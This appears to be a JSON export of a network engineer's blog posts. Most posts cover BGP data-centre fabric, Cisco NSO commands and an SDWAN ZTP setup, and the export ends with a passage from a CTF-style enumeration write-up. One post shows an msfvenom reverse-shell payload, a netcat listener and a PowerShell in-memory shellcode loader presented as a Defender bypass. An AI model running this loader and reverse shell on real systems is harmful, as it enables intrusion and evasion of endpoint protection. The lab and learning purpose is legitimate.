[{"content":"Introduction CLOS fabric using VLAN based access and BGP as the fabric routing procotol. The network is shown below. All switches are Cisco Nexus 9000v. Let\u0026rsquo;s go.\nLeaf Configuration Route-map All switches have been configured with tagged IP addresses. Those tags are handy when redistributing routes to BGP. The approach saves the hassle of using network clauses and prefix-maps.\nroute-map REDISTRIBUTION-MAP permit 10 match tag 12345 BFD Since we are talking about just BGP combined with a CLOS fabric it makes sense to enable BFD on all fabric links. This way link failures can be detected quite fast and BGP neighbors taken down to ensure fast convergence.\nfeature bfd int Ethernet1/1 bfd interval 50 min_rx 50 multiplier 3 int Ethernet1/2 bfd interval 50 min_rx 50 multiplier 3 BGP BGP is designed so that spines have their own AS number and leafs their own. Alternatively each leaf could have their own dedicated AS number. The con in that alternative is the need to allocate (potentially a lot of) unique AS numbers. On the other hand the pro is that we don\u0026rsquo;t need to configure special BGP \u0026ldquo;knobs\u0026rdquo; to allow the routes to propagate properly. That said BGP setup is super clean in this case.\nfeature bgp router bgp 65000 router-id 1.0.0.3 address-family ipv4 unicast redistribute direct route-map REDISTRIBUTION-MAP maximum-paths 4 neighbor 10.0.1.1 bfd remote-as 65010 description SPINE-1 update-source Eth1/1 address-family ipv4 unicast ! Accept inbound routes that carry own AS number. allowas-in 3 neighbor 10.0.2.1 bfd remote-as 65010 description SPINE-2 update-source Eth1/2 address-family ipv4 unicast allowas-in 3 Spine Configuration BGP configuration on spines is almost identical to leafs with one exception.\nfeature bgp router bgp 65010 router-id 1.0.0.1 address-family ipv4 unicast redistribute direct route-map REDISTRIBUTION-MAP maximum-paths 4 neighbor 10.0.1.2 bfd remote-as 65000 description LEAF-1 update-source Eth1/1 address-family ipv4 unicast ! Allows outbound advertisement to an AS that\u0026#39;s on path already disable-peer-as-check neighbor 10.0.1.6 bfd remote-as 65000 description LEAF-2 update-source Eth1/2 address-family ipv4 unicast disable-peer-as-check Lessons Simple and clean setup. Imagine it\u0026rsquo;s easier to maintain and expand compared to standalone VXLAN (without proper tools). ","permalink":"https://timo-juhani.github.io/logs/bgp-based-data-center-fabric/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eCLOS fabric using VLAN based access and BGP as the fabric routing procotol. The network is shown below. All switches are Cisco Nexus 9000v. Let\u0026rsquo;s go.\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"Network Diagram\" loading=\"lazy\" src=\"images/clos-fabric-bgp.png\"\u003e\u003c/p\u003e\n\u003ch2 id=\"leaf-configuration\"\u003eLeaf Configuration\u003c/h2\u003e\n\u003ch3 id=\"route-map\"\u003eRoute-map\u003c/h3\u003e\n\u003cp\u003eAll switches have been configured with tagged IP addresses. Those tags are handy when redistributing routes to BGP. The approach saves the hassle of using network clauses and prefix-maps.\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eroute-map REDISTRIBUTION-MAP permit 10\n  match tag 12345 \n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"bfd\"\u003eBFD\u003c/h3\u003e\n\u003cp\u003eSince we are talking about just BGP combined with a CLOS fabric it makes sense to enable BFD on all fabric links. This way link failures can be detected quite fast and BGP neighbors taken down to ensure fast convergence.\u003c/p\u003e","title":"BGP Based Data Center Fabric"},{"content":"First time is always the hardest. It helps if someone has already gone down the road and is ready to share their lessons learned.\nCisco NSO is a powerful network automation tool that can help network operations tremendously but is also known for a steep learning curve. This post aims to lay down an implementation pathway that enables fast wins and expands the scope gradually while avoiding overwhelming the engineering teams.\nFinally, I believe this same implementation template can be used for any project that aims to seize control over IT resources using some sort of centralized automation capability.\nWIN 1: System installation Get the tool installed to a data center or another centralized location that has management network connections to the devices. Prepare to get the permissions, compute capacity, and firewall rules in place prior to starting the installation.\nWIN 2: Take control over the devices This requires connecting to the devices using strong authentication and onboarding the devices to NSO. After that, you can start managing all your devices from a single CLI which on its own is an amazing benefit.\nWIN 3: Device templates Use device templates to establish standards that all network device configurations should comply with. A typical example is to set all static global security and network settings under a device template. You can use simple variables in device templates to set, for example, an IP address to your Loopback interface.\nWIN 4: Audit Audit the network using device templates and see where it needs fixing the most.\nWIN 5: Remediate the issues Apply the device template(s) to your devices to make sure they follow the standard you want to enforce.\nWIN 6-N: Develop network services It makes sense to start with the services that only affect a single device and then move on to more complex services that must be orchestrated on multiple devices.\nThe scope depends on the network designs you have. If you don\u0026rsquo;t have a documented network design - stop and create one. When it comes to automation you have to have a clear understanding of what workflow/design/task you\u0026rsquo;re automating first.\nYou should develop only one service at a time meaning that if you have a layered solution start from the bottom and work up. In networking, it typically means: build L2 first, then basic L3 connectivity, underlay routing, move on to L2 VPN services, and then L3VPN.\nClose collaboration and arm\u0026rsquo;s length distance should be a prerequisite for infra and dev teams.\nDon\u0026rsquo;t try to automate everything. For instance, it\u0026rsquo;s ok to begin with manually allocated variables and if needed automate them later on.\nAutomate only based on clear effort-benefit analysis. If you do a thing only once or twice per year is it worth automating.\ntime and cost to automate \u0026lt; time and cost to do * repetitions done Proper planning, preparation and execution saves blood, sweat and tears.\n","permalink":"https://timo-juhani.github.io/logs/phased-approach-to-cisco-nso/","summary":"\u003cp\u003eFirst time is always the hardest. It helps if someone has already gone down the road and is ready to share their lessons learned.\u003c/p\u003e\n\u003cp\u003eCisco NSO is a powerful network automation tool that can help network operations tremendously but is also known for a steep learning curve. This post aims to lay down an implementation pathway that enables fast wins and expands the scope gradually while avoiding overwhelming the engineering teams.\u003c/p\u003e","title":"Phased Approach To Cisco NSO"},{"content":"Yesterday around noon Nordnet received first messages about ongoing technical incident. In short, users were able to see other users stock accounts momentarily. The problem component according to Nordnet was a software component in login process. The remediation was to disable that component.\nStarting from the first moment the issue was reported Nordnet has 72 hours to provide a recitation to authorities explaining the incident.\nNordnet Incident Report\nLessons Something changed. System state won\u0026rsquo;t change on its own. Witnesses of privacy and security incidents should not interfere ,e.g., by sharing sreenshots via social media for the risk of themselves conducting a crime. ","permalink":"https://timo-juhani.github.io/logs/nordnet-incident/","summary":"\u003cp\u003eYesterday around noon Nordnet received first messages about ongoing technical incident. In short, users were able to see other users stock accounts momentarily. The problem component according to Nordnet was a software component in login process. The remediation was to disable that component.\u003c/p\u003e\n\u003cp\u003eStarting from the first moment the issue was reported Nordnet has 72 hours to provide a recitation to authorities explaining the incident.\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://www.nordnet.fi/faq/muut-aiheet/ongelmatilanteet/tietoa-teknisista-ongelmista-11-2-2025\"\u003eNordnet Incident Report\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"lessons\"\u003eLessons\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eSomething changed. System state won\u0026rsquo;t change on its own.\u003c/li\u003e\n\u003cli\u003eWitnesses of privacy and security incidents should not interfere ,e.g., by sharing sreenshots via social media for the risk of themselves conducting a crime.\u003c/li\u003e\n\u003c/ul\u003e","title":"Nordnet Incident"},{"content":"The evolving summary of key NSO commands.\nInstallation Local # Unpack Linux binary sh nso-6.0.linux.x86_64.installer.bin --local-install ~/nso-6.0 # Create a NSO instance (local setup) source ~/nso/ncsrc # Set env variables vim .bashrc source ~/nso-5.8/ncsrc # add to .bashrc source .bashrc # Verify NSO is on path echo $PATH # Run NCS setup to create a running directory ncs-setup --dest ~/nso-run # Or with NEDs ncs-setup \\ --package nso/packages/neds/cisco-ios-cli-6.91 \\ --dest nso-run cd ~/nso-run NEDs NEDs are distributed as compressed tar files (.tar.gz). NEDs are Cisco NSO packages. Cisco NSO expects to find packages in the packages subdirectory of the running directory:\nDo not store anything else in the packages directory. Do not keep old packages in the packages directory. You might need to recompile packages that were made for different versions of Cisco NSO. # Upack sh ncs-6.4-cisco-ios-6.107.2.signed.bin tar -xvzf ncs-6.4-cisco-ios-6.107.2.tar.gz # Move mv cisco-ios-cli-6.107 nso-6.2.8/packages/neds cd cisco-ios-cli-6.85/src # Compile cd nso-6.2.8/packages/neds/cisco-ios-cli-6.107/src make all # If need for re-compiling make clean make all # A succesful compilation reports BUILD SUCCESSFUL # Enter NSO CLI ncs_cli -u admin -C packages reload # Or when NSO is updated launch NSO with ncs --with-package-reload # Verify NED installation show packages package package-version Netsim # Create simulated network ncs-netsim --help ncs-netsim create-network \u0026lt;NcsPackage \u0026gt; \u0026lt;NumDevices\u0026gt; \u0026lt;Prefix\u0026gt; ncs-netsim create-network $HOME/neds/cisco-ios-cli-6.85 3 c ncs-netsim add-to-network neds/cisco-ios-cli-6.85 3 c ncs-netsim start # If NSO is already running or has been prior launched import the devices to # the inventory manually. ncs-netsim ncs-xml-init \u0026gt; devices.xml # Enter device configuration mode ncs-netsim cli-c c1 # Load devices to a running NSO ncs_load -l -m devices.xml Launch NSO cd ~/nso-instance ncs # Check NSO status ncs —-status | grep status # Enter CLI ncs_cli -u admin -C # Navigation config top end exit Launch NSO in Project Development Mode ncs-project create test-project cd test-project # Use Git! git init # Ignore all unimportant files from the repo printf \u0026#39;*\\n!.gitignore\u0026#39; | tee ncs-cdb/.gitignore state/.gitignore logs/.gitignore # Ignore all make files from the repo echo \u0026#34;setup.mk*\u0026#34; \u0026gt;\u0026gt; .gitignore # First commit git add -A git commit -m \u0026#34;first commit\u0026#34; Re-launch NSO After rebooting the host NSO must be relaunched.\n# Check NSO status (it\u0026#39;s shouldn\u0026#39;t be active) ncs —status | grep status # Run ncscrc source ~/nso/ncsrc # Launch the NSO cd ~/nso-dev ncs # Check the status again Stop or Reset NSO ncs --stop ncs-setup --reset Devices Authentication Credentials # Create an authentication group devices authgroups group labadmin # Set the credentials default-map remote-name cisco default-map remote-password cisco default-map remote-secondary-password cisco Add Devices Real Device # Name the device devices device edge-sw01 # Management IP address address 10.10.20.172 # Authentication credentials authgroup labadmssccin # NED type device-type cli ned-id cisco-ios-cli-6.67 # Remote command protocol device-type cli protocol ssh # Not the most secure way to go ssh host-key-verification none # Consider using SSH keys for authentication # Ping the device ping # Send a connection to the device connect # Unlock the device because by default NSO adds them as locked state admin-state unlocked NETSIM Device # Check which ports are used by NETSIM devices ncs-netsim list # If using default authgroup login as admin ncs_cli -C -u admin # Add a NETSIM device config devices device mydevice address 127.0.0.1 port 10022 device-type cli ned-id cisco-ios protocol ssh authgroup default state admin-state unlocked commit ssh fetch-host-keys sync-from end Device Synchronization # Check for sync devices device ios1 check-sync # Sync CDB from all inventory devices by fetching their configuration devices sync-from Device Groups # Use device groups to make working with the inventory more efficient. # Groups are logical tags. devices device-group SPOKES device-name rtr01 device-name rtr02 # Group that captures all devices. devices device-group ALL device-group SPOKES device-group HUBS \u0026lt;etc\u0026gt; # Check sync devices device-group ALL check-sync View Configuration # Device configuration show running-config devices device internet-rtr01 config show running-config devices device internet-rtr01 | de-select config # Interfaces show running-config devices device internet-rtr01 config interface show running-config devices device internet-rtr01 config interface | display json # Interface IP addresses # NSO allows using wildcards in commands show running-config devices device dist-sw01 config interface Vlan * ip address # XML format show configuration | display xml show full-configuration devices device ios1 config | display xml Update Configuration # Enter device configuration mode devices device ios0 config # Verify the path pwd # Enter configuration changes and commit # Configure multiple devices simultaneously devices device * config ios:enable password magic Commit Changes # Commit dry-run commit dry-run outformat native # Apply changes commit Rollback Changes # See the rollback for last configuration update show configuration rollback changes # Load the rollback rollback configuration # Verify the intended rollback show configuration # Verify the commands that will be sent to the device commit dry-run outformat native # Rollback commit Templates Devices can be managed individually using NSO as a super-CLI but using templates multiple devices can be managed at same time using a shared template.\nCreate # Create a template using a correct NED # NOTE: If the template must support multiple OS types just add another ned-id # and punch in the configuration. devices template SET-DNS-SERVER ned-id cisco-nx-cli-5.20 config # Add configuration items (OpenDNS servers) ip name-server servers 208.67.222.222 ip name-server servers 208.67.220.220 # Check on the changes show configuration # Save the changes commit Apply # List the devices show devices list # Apply the template on the target device devices device dist-sw01 apply-template template-name SET-DNS-SERVER # Or apply using device group devices device-group ALL apply-template template-name SET-DNS-SERVER # Perform the pre-commit SOP show configuration commit dry-run outformat native commit # If the commit doesn\u0026#39;t look good revert the staged changes with revert Device Operational State Configuration DB Reads from NSO\u0026rsquo;s configuration DB.\nshow devices device dist-sw01 platform show devices device dist-sw01 platform serial-number # Remember that wildcard works show devices device * platform serial-number show devices device * platform version Live Status Reads directly for the device as it runs.\n# NED supported commands show devices device dist-sw01 live-status port-channel show devices device dist-sw01 live-status ip route # Raw commands using exec flag devices device dist-sw01 live-status exec show license usage devices device dist-sw01 live-status exec any dir # Pipe the output to a file on the OS devices device dist* live-status exec show license usage | save /tmp/output.txt XPath Finding XPath\u0026rsquo;s can be done using NSO\u0026rsquo;s show commands.\n# Native devices device r1 config interface GigabitEthernet 0/1 ipv4 address | display xpath show running-config devices device edge-sw01 config vlan | display xpath # Developer Tools devtools true xpath eval /devices/device[name=\u0026#39;internet-rtr01\u0026#39;]/config/interface/Loopback Configuration Compliance Goals:\nBuild a device template that contains the desired configuration to test. Build a compliance report to check the configuration against a template. Notes:\nResults support HTML, Bash, or XML format. XML is the default. NSO saves the results to a file located in the folder state/compliance-reports NSO runs a web server so these reports are available. # Create the device template for compliancy check devices template COMPLIANCE-CHECK ned-id cisco-ios-cli-6.67 config ip name-server name-server-list 208.67.222.222 ip name-server name-server-list 208.67.220.220 service timestamps log datetime localtime show-timezone year logging host ipv4 10.225.1.11 ntp server peer-list 10.225.1.11 # Create the compliancy check compliance reports report COMPLIANCE-CHECK compare-template COMPLIANCE-CHECK ALL commit # Run the compliancy check compliance reports report COMPLIANCE-CHECK run # And define outformat if needed (text, html, xml) compliance reports report COMPLIANCE-CHECK run outformat text # Resolve the compliancy issues by applying the template to devices. Services Service is a configuration engine that uses templates and variables to render configurations that can be repeatedly applied. Services are divided to customer facing and resource facing. The former is what is exposed to the user and the latter is called and executed against the device.\nCreate a Service Package NSO uses YANG to define the variable names and constraints on those variables. NSO uses XML behind the scenes to represent every device\u0026rsquo;s configuration.\ncd nso-instance/packages/ ls ncs-make-package -h # Template used with static variables. ncs-make-package --service-skeleton template loopback-service # Python \u0026amp; template used when dynamic variables are required. ncs-make-package --service-skeleton python-and-template svi Create YANG Model # Confirm the model is correct. # NOTE: This may produce a long list of errors not related to the package being # developed. Those can be ignored. pyang looback.yang # Make cd ~/nso-run/packages/loopback/src make # Reload package in NSO # Required every time there is a change in YANG model packages reload Create XML Configuration Template SOP Alpha: Use NSO (NED) device config mode to create the XML.\nshow configuration commit dry-run outformat xml SOP Bravo: Use NSO to pull native device configuration in XML format.\nshow full-configuration devices device ios1 config | display xml Copy text between config tags only and paste it to the .xml template file created during ncs-make-package.\nAdd variable tags to the template and append YANG variables with each variable tag and data type. Parameter names must match those modeled with YANG.\n# Static variable \u0026lt;secret\u0026gt;{/secret}\u0026lt;/secret\u0026gt; # Python based variable \u0026lt;ip\u0026gt;{$IP-ADDR}\u0026lt;/ip\u0026gt; Exit NSO session and then:\ncd loopback-service/src/ make Enter NSO and reload packages.\nncs_cli -C -u admin packages reload Create a Service Instance # Create a customer if it\u0026#39;s not there already config customers customer ACME # General flow example # Configure a service on a device simple-service test1 device ios0 secret mypasswd # L3VPN example services l3vpn ACME vpn-id 10001 customer ACME link 2 link-name Site1 pe-device PE11 interface 0/1 routing-protocol bgp neighbor 172.16.1.1 exit link 3 link-name Site3 pe-device PE31 interface 0/1 routing-protocol static static-route 192.168.1.0 mask 255.255.255.0 exit static-route 192.168.2.0 mask 255.255.255.0 # Check the current running config of a service in table format show running-config services l3vpn | tab # And in XPATH show running-config services l3vpn ACME | display xpath Service Instance Management # Checks the sync from NSO CDB services l3mplsvpn S1 check-sync # Checks the sync from device itself (remote) services l3mplsvpn S1 deep-check-sync # Redeploy a service if changes were made manually after deploying the service simple-service test1 re-deploy # Undeploy from devices but keep in NSO CDB simple-service test1 un-deploy # Delete the service no simple-service test1 # Get service modifications simple-service test1 get-modifications # Compare device configuration to configuration in NSO CDB simple-service test1 compare-config # Debug Python code tail -n 20 ~/nso-run/logs/ncs-python-vm-svi.log ","permalink":"https://timo-juhani.github.io/logs/nso-cheatsheet/","summary":"\u003cp\u003eThe evolving summary of key NSO commands.\u003c/p\u003e\n\u003ch2 id=\"installation\"\u003eInstallation\u003c/h2\u003e\n\u003ch3 id=\"local\"\u003eLocal\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e# Unpack Linux binary\nsh nso-6.0.linux.x86_64.installer.bin --local-install ~/nso-6.0\n\n# Create a NSO instance (local setup)\nsource ~/nso/ncsrc\n\n# Set env variables\nvim .bashrc\nsource ~/nso-5.8/ncsrc # add to .bashrc\nsource .bashrc\n\n# Verify NSO is on path\necho $PATH\n\n# Run NCS setup to create a running directory\nncs-setup --dest ~/nso-run\n\n# Or with NEDs\nncs-setup \\\n--package nso/packages/neds/cisco-ios-cli-6.91 \\\n--dest nso-run\ncd ~/nso-run\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"neds\"\u003eNEDs\u003c/h3\u003e\n\u003cp\u003eNEDs are distributed as compressed tar files (.tar.gz).\nNEDs are Cisco NSO packages. Cisco NSO expects to find packages in the packages\nsubdirectory of the running directory:\u003c/p\u003e","title":"NSO Cheatsheet"},{"content":"When Microsoft Defender is enabled a way to bypass it is to execute the shell code by loading it to the memory. I found this technique interesting and worth saving for later use.\nPayload # Create payload with msfvenom msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.184.18 LPORT=4444 -f powershell Start A Listener rlwrap nc -nvlp 4444 Execute The Payload # Copy and paste directly to PowerShell # Phase 1 $VrtAlloc = @\u0026#34; using System; using System.Runtime.InteropServices; public class VrtAlloc{ [DllImport(\u0026#34;kernel32\u0026#34;)] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); } \u0026#34;@ Add-Type $VrtAlloc $WaitFor= @\u0026#34; using System; using System.Runtime.InteropServices; public class WaitFor{ [DllImport(\u0026#34;kernel32.dll\u0026#34;, SetLastError=true)] public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); } \u0026#34;@ Add-Type $WaitFor $CrtThread= @\u0026#34; using System; using System.Runtime.InteropServices; public class CrtThread{ [DllImport(\u0026#34;kernel32\u0026#34;, CharSet=CharSet.Ansi)] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); } \u0026#34;@ Add-Type $CrtThread # Phase 2 [Byte[]] $buf = \u0026lt;PAYLOAD-HERE\u0026gt; # Phase 3 [IntPtr]$addr = [VrtAlloc]::VirtualAlloc(0, $buf.Length, 0x3000, 0x40) [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length) $thandle = [CrtThread]::CreateThread(0, 0, $addr, 0, 0, 0) [WaitFor]::WaitForSingleObject($thandle, [uint32]\u0026#34;0xFFFFFFFF\u0026#34;) Not a novel but still a super interesting technique for me.\n","permalink":"https://timo-juhani.github.io/logs/rshelling-with-defender-enabled/","summary":"\u003cp\u003eWhen Microsoft Defender is enabled a way to bypass it is to execute the shell code by loading it to the memory. I found this technique interesting and worth saving for later use.\u003c/p\u003e\n\u003ch2 id=\"payload\"\u003ePayload\u003c/h2\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e# Create payload with msfvenom\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.184.18 LPORT=4444 -f powershell\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"start-a-listener\"\u003eStart A Listener\u003c/h2\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003erlwrap nc -nvlp 4444\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"execute-the-payload\"\u003eExecute The Payload\u003c/h2\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e# Copy and paste directly to PowerShell\n# Phase 1\n$VrtAlloc = @\u0026#34;\nusing System;\nusing System.Runtime.InteropServices;\n\npublic class VrtAlloc{\n    [DllImport(\u0026#34;kernel32\u0026#34;)]\n    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);  \n}\n\u0026#34;@\n\nAdd-Type $VrtAlloc \n\n$WaitFor= @\u0026#34;\nusing System;\nusing System.Runtime.InteropServices;\n\npublic class WaitFor{\n [DllImport(\u0026#34;kernel32.dll\u0026#34;, SetLastError=true)]\n    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);   \n}\n\u0026#34;@\n\nAdd-Type $WaitFor\n\n$CrtThread= @\u0026#34;\nusing System;\nusing System.Runtime.InteropServices;\n\npublic class CrtThread{\n [DllImport(\u0026#34;kernel32\u0026#34;, CharSet=CharSet.Ansi)]\n    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n  \n}\n\u0026#34;@\nAdd-Type $CrtThread   \n\n# Phase 2\n[Byte[]] $buf = \u0026lt;PAYLOAD-HERE\u0026gt;\n\n# Phase 3\n[IntPtr]$addr = [VrtAlloc]::VirtualAlloc(0, $buf.Length, 0x3000, 0x40)\n[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length)\n$thandle = [CrtThread]::CreateThread(0, 0, $addr, 0, 0, 0)\n[WaitFor]::WaitForSingleObject($thandle, [uint32]\u0026#34;0xFFFFFFFF\u0026#34;)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eNot a novel but still a super interesting technique for me.\u003c/p\u003e","title":"RSHELLing With Defender Enabled"},{"content":"This is a short after action report covering how to deploy an air-gapped ZTP server for Cisco SDWAN.\nThe motivation for this log is to fill in the gaps in other documentations and provide a step by step approach how to get to the end goal.\n1. Networking The networking setup is case by case. The goal is to have IP level reachability and make sure that DHCP requests find their target even if their destination is outside their LAN.\nThe networking setup used here is the kind where there is a separate staging / install LAN, another LAN for MGMT and shared services such as DNS/DHCP and one for the actual SDWAN underlay on which the VPNs will be deployed.\n# The configuration at the gateway. # Make sure to use helper address if the DHCP/DNS server residers in a different network. interface GigabitEthernet0/0/0.101 description SDWAN-INSTALL-GW encapsulation dot1Q 101 ip address 10.1.101.1 255.255.255.0 ip helper-address 10.1.106.60 2. DHCP and DNS Server Installation Depending on the DNS/DHCP server you use this step is different. In this installation Dnsmasq was selected.\nInstall Dnsmasq using your distro\u0026rsquo;s package manager. If in doubt, duckduckgo.com.\nConfiguring Dnsmasq The configuration required at Dnsmasq is quite simple for this task.\nThe key points to cover you need a DNS server and a DHCP server which provides the domain name with Option 15 and the name server with Option 6. That\u0026rsquo;s it.\nMake sure to tailor the configuration with the right IPs, domain name and interface you are using.\n# The concents of /etc/dnsmasq.conf # Listen to listen-address=::1,127.0.0.1,10.1.106.60 interface=ens160 port=53 domain-needed bogus-priv strict-order expand-hosts # Local domain domain=local.domain # Upstream servers server=208.67.222.222 # DHCP for SDWAN ZTP dhcp-range=ens160,10.1.101.240,10.1.101.250,24h dhcp-option=ens160,15,local.domain dhcp-option=ens160,6,10.1.106.60 Configuring /etc/hosts File Dnsmasq relies on /etc/hosts file. Therefore, make sure to add the following entries at minimum.\nDuring ZTP onboarding process the device tries to resolve the ztp.local.domain to find the ZTP server. Without this entry the onboarding can\u0026rsquo;t even start.\n# DNS SERVER ITSELF 127.0.0.1 localhost 127.0.1.1 bubo 10.1.106.60\tbubo # SDWAN UNDERLAY HOSTS 10.1.100.63\tztp.local.domain Monitoring # Monitor the DHCP server tail -f /var/lib/misc/dnsmasq.leases # Monitor packets arriving from the installation network sudo tcpdump net 10.1.101.0/24 3. ZTP Server Installation Installation media can be downloaded from Cisco.com: https://software.cisco.com/download/home/286320954\nZTP server uses the same .ova as vBond. Drop that .ova to your ESXi.\nPlace the first network interface to your OOB portgroup and the second one to SDWAN underlay porgroup. Naturally, use freedom here. The main point is to make sure you have L2 reachability to the right ports from the right segments.\nOnce the .ova has deployed login with admin:admin and configure the ZTP server.\nConfiguration The configuration presented here is simplistic. It\u0026rsquo;s all you need to get the setup working. You might want to review the configuration for production environment. For a prototype, though, this is enough.\nMake sure to use the same organization name as the rest of the SDWAN infra and use the ztp-server keyword to let the box to know it should work as a ZTP server. VPN 512 is for OOB management and therefore optional. However, it\u0026rsquo;s a small piece of configuration for a big reliability gain.\nRemember to commit your configuration.\nsystem host-name sdwan-ztp-server system-ip 10.1.106.67 organization-name SPRINT vbond 10.1.100.63 local ztp-server vpn 0 interface ge0/0 ip address 10.1.100.63/24 no shutdown ip route 0.0.0.0/0 10.1.100.1 vpn 512 interface eth0 ip address 10.1.100.65/24 no shutdown ip route 0.0.0.0/0 10.1.106.1 commit Device List The device list is for letting the ZTP know which devices should be allowed to the network.\nDownload the list from software.cisco \u0026gt; PnP \u0026gt; Controller Profiles \u0026gt; Download \u0026gt; Provisioning File\nThen just SCP the list from your management box to the ZTP server and install the file.\n# Install request device-upload chassis-file /home/admin/serialFile.viptela # Confirm show ztp entries Certificate ZTP server certificate must be signed by Cisco. Why? Because the devices that you\u0026rsquo;ll be onboarding with the server come from the factory and don\u0026rsquo;t have a clue about your enterprise CA.\nOther than that you can use your own enterprise CA for the other controllers.\nPay attention to the point in which the certificate is fixed so that the installation will succeed.\nThis is how you do it:\n# Create CSR request csr upload home/admin/sdwan-ztp.csr # Export and copy request execute cat /home/admin/sdwan-ztp.csr Copy the CSR # Upload to Cisco PKI for signing Go to software.cisco.com \u0026gt; PnP Connect \u0026gt; Certificates \u0026gt; Generate Certificate Paste the CSR in \u0026#34;Certificate Signing Request\u0026#34; box Fill the info and press next # Download the certificate Press the dowload button from actions column # Fix the certificate with a text editor # The downloaded certificate lacks the first and last line of a normal certificate -----BEGIN CERTIFICATE----- \u0026lt;place the downloaded certificate payload here\u0026gt; -----END CERTIFICATE----- # Transfer to ZTP server and install the certificate request certificate install /home/admin/SDWAN-ZTP.cer Monitor Remember to run tcpdump on the ZTP server. Ideally, you should eyes on the key servers to make sure all goes well. Especially when you are onboarding the very first few devices.\ntcpdump interface ge0/0 4. Onboard Router The process kicks off when you power on a device that doesn\u0026rsquo;t have a startup config.\nDepending on the device type the boot and ZTP process could take a longish time so be patient.\nYou should monitor you DHCP/DNS and ZTP servers. The first good sign you\u0026rsquo;ll see is a DHCP lease at Dnsmasq.\nAfter that move your focus on the Dnsmasq tcpdump and expect to see a whole lot of DNS queries. The one that you\u0026rsquo;re interested in is the record for ztp.local.domain. However, as said this could take a while and before that it\u0026rsquo;s likely you\u0026rsquo;ll see other DNS queries related to other automated onboarding protocols. Be patient.\nWhen you see ztp.local.domain being resolved take a glance at the ZTP server\u0026rsquo;s tcpdump and you should star to see an increasing amount of communications at UDP port 12346 which is the DTLS control channel.\nIf you think you need to start over you can reset the ZTP process on the router using the command below.\n# A command to reset the configuration and reload the device. request platform software sdwan software reset Once the onboarding is complete the device should appear to vManage / Manager. But you can check on it via CLI too:\nshow sdwan control local-properties show sdwan control connections-history Lesson Learned Complex process requires multiple points of monitoring. Sometimes to verify is to only hack and test. Onboarding for certain devices is slow so patience is key. Always have to time to document. It makes no sense someone else to repeat your struggles. ","permalink":"https://timo-juhani.github.io/logs/cisco-sdwan-air-gapped-ztp/","summary":"\u003cp\u003eThis is a short after action report covering how to deploy an air-gapped ZTP server for Cisco SDWAN.\u003c/p\u003e\n\u003cp\u003eThe motivation for this log is to fill in the gaps in other documentations and provide a step by step approach how to get to the end goal.\u003c/p\u003e\n\u003ch2 id=\"1-networking\"\u003e1. Networking\u003c/h2\u003e\n\u003cp\u003eThe networking setup is case by case. The goal is to have IP level reachability and make sure that DHCP requests find their target even if their destination is outside their LAN.\u003c/p\u003e","title":"Cisco SDWAN and Air-Gapped ZTP Server"},{"content":"Initial Scans Port Scan Initial port scan showed open web and RDP ports. Based on the output below the system was detected to be a Windows host running IIS web server.\nnmap -sV 10.10.214.63 Starting Nmap 7.60 ( https://nmap.org ) at 2024-09-02 09:16 BST Nmap scan report for ip-10-10-214-63.eu-west-1.compute.internal (10.10.214.63) Host is up (0.00052s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 3389/tcp open ms-wbt-server Microsoft Terminal Services MAC Address: 02:F2:D4:2C:99:29 (Unknown) Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 30.31 seconds Web Enumeration \u0026amp; Scan / Version: IIS httpd 10.0.\nThe homepage page displays the default ISS page. Enumerated directories using Gobuster.\ngobuster dir -u http://10.10.214.63 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.214.63 [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2024/09/02 09:19:28 Starting gobuster =============================================================== /retro (Status: 301) /Retro (Status: 301) =============================================================== 2024/09/02 09:20:06 Finished =============================================================== Manual Enumeration Browsing the web page an interesting comment from user \u0026ldquo;Wade\u0026rdquo; is found here: http://10.10.214.63/retro/index.php/2019/12/09/ready-player-one/#comment-2\nLeaving myself a note here just in case I forget how to spell it: parzival /retro Scanning /retro with Gobuster shows that the web site is built on a Wordpress instance.\ngobuster dir -u http://10.10.214.63/retro -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian 